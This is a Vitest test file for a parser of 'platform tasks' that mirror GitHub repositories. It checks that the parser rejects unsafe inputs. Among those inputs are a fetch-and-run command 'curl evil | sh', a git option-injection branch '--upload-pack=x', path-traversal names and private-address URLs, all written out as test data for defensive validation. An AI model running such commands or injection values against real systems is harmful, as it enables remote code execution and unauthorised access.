/**
 * Platform tasks' schema: only the shipped kinds, only GitHub HTTPS repositories, names and
 * branches that cannot become paths or options.
 */
import { describe, expect, it } from "vitest";
import {
	parsePlatformTasks,
	parsePlatformTasksYaml,
} from "../src/platform-tasks.js";

const ok = {
	kind: "git-mirror",
	name: "magi-v3",
	params: { url: "https://github.com/arnadu/magi_v3", branch: "main" },
};

describe("parsePlatformTasks", () => {
	it("accepts a git-mirror task and defaults its interval", () => {
		expect(parsePlatformTasks([ok])).toEqual([{ ...ok, everyMinutes: 15 }]);
	});

	it("treats a missing list as none", () => {
		expect(parsePlatformTasks(undefined)).toEqual([]);
		expect(parsePlatformTasks(null)).toEqual([]);
	});

	it.each([
		["an unknown kind", { ...ok, kind: "shell" }],
		["a script field", { ...ok, script: "curl evil | sh" }],
		[
			"plain http",
			{ ...ok, params: { ...ok.params, url: "http://github.com/a/b" } },
		],
		[
			"another host",
			{ ...ok, params: { ...ok.params, url: "https://gitlab.com/a/b" } },
		],
		[
			"a private address",
			{ ...ok, params: { ...ok.params, url: "https://[fdaa::3]/a/b" } },
		],
		[
			"credentials in the url",
			{ ...ok, params: { ...ok.params, url: "https://x:y@github.com/a/b" } },
		],
		[
			"a path below the repo",
			{ ...ok, params: { ...ok.params, url: "https://github.com/a/b/c" } },
		],
		[
			"a branch that is an option",
			{ ...ok, params: { ...ok.params, branch: "--upload-pack=x" } },
		],
		["a branch with ..", { ...ok, params: { ...ok.params, branch: "a/../b" } }],
		["a name with a slash", { ...ok, name: "../etc" }],
		["a name in capitals", { ...ok, name: "Magi" }],
		["an interval under 5 minutes", { ...ok, everyMinutes: 1 }],
		["an extra parameter", { ...ok, params: { ...ok.params, depth: 1 } }],
	])("refuses %s", (_what, task) => {
		expect(() => parsePlatformTasks([task])).toThrow();
	});

	it("refuses two tasks with one name", () => {
		expect(() => parsePlatformTasks([ok, ok])).toThrow(/unique/);
	});

	it("reads the section from a team YAML", () => {
		const yaml = `mission:\n  id: x\n  name: x\nplatformTasks:\n  - kind: git-mirror\n    name: magi-v3\n    params:\n      url: https://github.com/arnadu/magi_v3\n      branch: main\n    everyMinutes: 30\n`;
		expect(parsePlatformTasksYaml(yaml)).toEqual([{ ...ok, everyMinutes: 30 }]);
		expect(parsePlatformTasksYaml("mission:\n  id: x\n")).toEqual([]);
	});
});
